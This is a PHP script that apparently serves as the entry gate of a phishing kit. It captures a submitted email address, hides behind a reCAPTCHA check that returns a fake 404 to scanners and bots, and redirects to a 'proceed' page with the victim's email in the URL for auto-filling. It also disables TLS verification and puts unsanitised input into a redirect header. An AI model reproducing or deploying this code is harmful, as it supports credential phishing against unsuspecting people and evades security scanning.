<?php

session_start();
include('css/css1.php');
include('css/css2.php');
include('css/css3.php');
include('css/css4.php');
include('css/css5.php');
$text = $_POST['email'];
if (!empty($text)) {
  $res = preg_match_all(
    "/[a-z0-9]+([_\\.-][a-z0-9]+)*@([a-z0-9]+([\.-][a-z0-9]+)*)+\\.[a-z]{2,}/i",
    $text,
    $matches
  );

  if ($res) {
    foreach(array_unique($matches[0]) as $eee3) {
    }
  }
}


$tokenzz = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$tokenzzhex = bin2hex(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$_SESSION['tokenzz'] = $tokenzz;
$_SESSION['tokenzzhex'] = $tokenzzhex;
require 'config.php';
$name = "'$eee3'";
if(empty($_POST['g-recaptcha-response'])){
    	  exit(header('HTTP/1.0 404 Not Found'));	
}
	    if(isset($_POST['g-recaptcha-response']) && !empty($_POST['g-recaptcha-response'])) {
//        $Response = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$captcha_secret_key.'&response='.$_POST['g-recaptcha-response'].'');
$data = array(
            'secret' => "".$captcha_secret_key."",
            'response' => "".$_POST['g-recaptcha-response'].""
        );
$verify = curl_init();
curl_setopt($verify, CURLOPT_URL, "https://www.google.com/recaptcha/api/siteverify");
curl_setopt($verify, CURLOPT_POST, true);
curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($verify, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($verify, CURLOPT_RETURNTRANSFER, true);
$Response = curl_exec($verify);

        $Return = json_decode($Response);
    if($Return->success == true && $Return->score > 0.0){
		

}
}
/*
FOR AUTO::
<?php echo $name; ?>

*/


exit(header("Location: proceed?data=".$eee3.""));
?>